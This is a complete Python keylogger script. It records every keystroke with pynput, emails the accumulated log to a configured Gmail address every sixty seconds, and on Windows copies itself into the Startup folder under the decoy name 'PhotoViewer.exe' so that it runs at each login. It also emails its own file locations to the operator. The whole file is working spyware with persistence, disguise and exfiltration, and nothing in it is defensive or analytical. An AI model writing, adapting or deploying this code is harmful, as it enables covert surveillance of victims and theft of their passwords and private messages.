import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
import threading
import time
import os
import shutil

# Config for email (replace these with your details)
EMAIL_ADDRESS = "your_email@gmail.com"  # Your Gmail address
EMAIL_PASSWORD = "your_app_password"    # Your Gmail App Password
TO_EMAIL = "receiver_email@gmail.com"  # Where logs are sent
LOG_FILE = "keylog.txt"  # Relative path (use /tmp/keylog.txt for Linux)
SEND_INTERVAL = 60  # Send email every 60 seconds

# Buffer to store keystrokes
keys = []

def add_to_startup():
    file_location = ""
    try:
        if os.name == 'nt':  # Windows
            exe_path = os.path.abspath("PhotoViewer.exe")  # Match renamed .exe
            startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            shutil.copy(exe_path, startup_path)
            file_location = f"Original file: {exe_path}\nStartup copy: {os.path.join(startup_path, 'PhotoViewer.exe')}"
        else:
            file_location = "Not on Windows, no startup copy made."
        send_initial_location(file_location)
    except Exception as e:
        file_location = f"Error adding to startup: {e}"
        send_initial_location(file_location)

def send_initial_location(file_location):
    try:
        msg = MIMEText(f"Keylogger started.\nFile locations:\n{file_location}")
        msg['Subject'] = 'Keylogger Location Report'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
    except Exception as e:
        print(f"Error sending location email: {e}")

def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        if key == Key.space:
            key_str = " "
        elif key == Key.enter:
            key_str = "\n"
        elif key == Key.tab:
            key_str = "\t"
        elif key == Key.backspace:
            key_str = "[BACKSPACE]"
        elif key == Key.shift or key == Key.shift_r:
            key_str = "[SHIFT]"
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            key_str = "[CTRL]"
        elif key == Key.alt_l or key == Key.alt_r:
            key_str = "[ALT]"
        keys.append(key_str)
        with open(LOG_FILE, "a") as f:
            f.write(key_str)
    except Exception as e:
        print(f"Error logging key: {e}")

def send_email():
    while True:
        try:
            content = ""
            if os.path.exists(LOG_FILE):  # Check if file exists
                with open(LOG_FILE, "r") as f:
                    content = f.read()
            else:
                content = "No keystrokes logged yet."

            if content:
                msg = MIMEText(content)
                msg['Subject'] = 'Keylog Update'
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = TO_EMAIL
                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())

                if os.path.exists(LOG_FILE):
                    open(LOG_FILE, "w").close()  # Clear the file

        except Exception as e:
            print(f"Error sending email: {e}")

        time.sleep(SEND_INTERVAL)

def main():
    add_to_startup()  # Add to startup and send location
    email_thread = threading.Thread(target=send_email)
    email_thread.daemon = True
    email_thread.start()

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()